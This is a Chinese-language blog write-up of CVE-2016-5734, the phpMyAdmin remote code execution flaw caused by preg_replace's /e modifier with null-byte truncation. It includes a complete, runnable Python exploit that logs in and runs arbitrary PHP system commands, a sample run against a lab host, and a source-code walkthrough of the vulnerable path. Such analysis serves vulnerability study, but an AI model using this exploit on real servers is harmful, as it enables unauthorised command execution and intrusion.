---
# 当前页面内容标题
title: CVE-2016-5734
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - CVE
tag:
    - phpmyadmin
    - php
    - 任意远程代码执行
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
order: 1
date: 2023-02-02
# 浏览量
pageview: true
---

## 漏洞详情

在`php5.4.7`以前，`preg_replace`函数的第一参数可以使用`\0`进行截断，而e模式的正则支持执行代码，在这种情况下，当`preg_replace`的第一个参数可控时，则会造成任意远程代码执行漏洞

| 漏洞名称        | phpMyAdmin远程代码执行漏洞（CVE-2016-5734）                  |
| --------------- | ------------------------------------------------------------ |
| <b>发布时间</b> | <b>2016年06月21日</b>                                        |
| <b>漏洞编号</b> | <b>CVE-2016-5734</b>                                         |
| <b>威胁类型</b> | <b>远程代码执行</b>                                          |
| <b>威胁级别</b> | <b>严重</b>                                                  |
| <b>利用条件</b> | <b>- 必须登录<br>- php版本小于5.4.7</b>                      |
| <b>影响版本</b> | <b>- 4.0.10.16之前4.0.x版本<br>\- 4.4.15.7之前4.4.x版本<br>\- 4.6.3之前4.6.x版本</b> |

![image-20230202211218650](/CVE-2016-5734/image-20230202211218650.png)

## POC

```python
import requests
import argparse
import sys

__author__ = "@iamsecurity"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="URL with path to PMA")
    parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")
    parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA user")
    parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for valid PMA user")
    parser.add_argument("-d", "--dbs", type=str, help="Existing database at a server")
    parser.add_argument("-T", "--table", type=str, help="Custom table name for exploit.")
    arguments = parser.parse_args()
    url_to_pma = arguments.url
    uname = arguments.user
    upass = arguments.pwd
    if arguments.dbs:
        db = arguments.dbs
    else:
        db = "test"
    token = False
    custom_table = False
    if arguments.table:
        custom_table = True
        table = arguments.table
    else:
        table = "prgpwn"
    if arguments.cmd:
        payload = arguments.cmd
    else:
        payload = "system('uname -a');"

    size = 32
    s = requests.Session()
    # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)

    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    if token is False:
        print("Cannot get valid authorization token.")
        sys.exit(1)

    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")]
                    if "already exists" in error:
                        print(error)
                    else:
                        print("ERROR: " + error)
                        sys.exit(1)
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:]
        if len(result):
            print("result: " + result)
            sys.exit(0)
        print(
            "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp"
        )
        sys.exit(1)
```

运行命令：

```shell
test.py -u root --pwd="root" http://192.168.79.128:32769/ -c "system('ls -lua');"
```

运行效果：

![image-20230202194526421](/CVE-2016-5734/image-20230202194526421.png)

## 漏洞分析

从上面的`POC`中可以看出，代码分别向目标请求了三次

第一次是登录请求，并获取`token`

```python
# get_token
resp = s.post(url_to_pma + "/?lang=en", dict(
     pma_username=uname,
     pma_password=upass
))
```

![image-20230202214907807](/CVE-2016-5734/image-20230202214907807.png)

第二次请求`/import.php`，创建表

```python
sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
      ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
      INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
      '''.format(table)
······
if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
```

![image-20230202215331206](/CVE-2016-5734/image-20230202215331206.png)

第三次是请求`tbl_find_replace.php`，插入数据`"0/e\0"`，并执行payload

```python
exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
}
resp = s.post(url_to_pma + "/tbl_find_replace.php", exploit,cookies=requests.utils.dict_from_cookiejar(s.cookies))
```

![image-20230202215408756](/CVE-2016-5734/image-20230202215408756.png)

通过这三次请求，可以发现漏洞主要出现在`tbl_find_replace.php`，因为无论是登录还是创建表格都是`phpmyadmin`本身就有的功能

所以这次只需要查看这次分析只需要查看`tbl_find_replace.php`就可以了

首先进入`tbl_find_replace.php`，在这里了一下发现没有`preg_replace`这个函数，说明漏洞不在这里

```php
$response = PMA_Response::getInstance();
$table_search = new PMA_TableSearch($db, $table, "replace");

$connectionCharSet = $GLOBALS['dbi']->fetchValue(
    "SHOW VARIABLES LIKE 'character_set_connection'", 0, 1
);
// 这里判断post请求是否存在find
if (isset($_POST['find'])) {
    $preview = $table_search->getReplacePreview(
        $_POST['columnIndex'],
        $_POST['find'],
        $_POST['replaceWith'],
        $_POST['useRegex'],
        $connectionCharSet
    );
    $response->addJSON('preview', $preview);
    // 这里退出所以后面的代码对我们来说没有用了
    exit;
}
```

从上面的代码可以看出，当POST包含find参数时，会调用`$table_search->getReplacePreview`，然后`exit`说明漏洞可能在`$table_search->getReplacePreview`中

这里通过`vscode`进行搜索，`getReplacePreview`函数在`TableSearch.class.php`中

![image-20230202221851990](/CVE-2016-5734/image-20230202221851990.png)

进入`TableSearch.class.php`，下面是幻灯片演示（试试功能）

@slidestart

## 进入`getReplacePreview`

在这里判断`useRegex`是否为启用，如果启用则进入`_getRegexReplaceRows`
```php
$column = $this->_columnNames[$columnIndex];
if ($useRegex) {
	$result = $this->_getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet);
}
```

---

## 进入`_getRegexReplaceRows`

在这里可以看出，这里拼接了一个sql查询语句，并且执行

```php
$column = $this->_columnNames[$columnIndex];
$sql_query = "SELECT "
            . PMA_Util::backquote($column) . ","
            . " 1," // to add an extra column that will have replaced value
            . " COUNT(*)"
            . " FROM " . PMA_Util::backquote($this->_db)
            . "." . PMA_Util::backquote($this->_table)
            . " WHERE " . PMA_Util::backquote($column)
            . " RLIKE '" . PMA_Util::sqlAddSlashes($find) . "' COLLATE "
            . $charSet . "_bin"; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
$sql_query .= " GROUP BY " . PMA_Util::backquote($column)
            . " ORDER BY " . PMA_Util::backquote($column) . " ASC";
        
$result = $GLOBALS['dbi']->fetchResult($sql_query, 0);
```

---

## 执行preg_replace

首先判断判 `$result`是否为数组类型，然后执行 `preg_replace`

当`$find`也就是`find`参数等于`0/e\0`时，即可对字符串进行截断，执行`$replaceWith`代码

```php
if (is_array($result)) {
  foreach ($result as $index=>$row) {
      $result[$index][1] = preg_replace(
      "/" . $find . "/",
      $replaceWith,
      $row[0]
    );
  }
}
```

---

## 返回getReplacePreview

将结果输出

```php
if (is_array($result)) {
    foreach ($result as $row) {
        $val = $row[0];
        $replaced = $row[1];
        $count = $row[2];
        $htmlOutput .= '<tr class="' . ($odd ? 'odd' : 'even') . '">';
        $htmlOutput .= '<td class="right">' . htmlspecialchars($count)
            . '</td>';
        $htmlOutput .= '<td>' . htmlspecialchars($val) . '</td>';
        $htmlOutput .= '<td>' . htmlspecialchars($replaced) . '</td>';
        $htmlOutput .= '</tr>';
        $odd = ! $odd;
    }
}
```

@slideend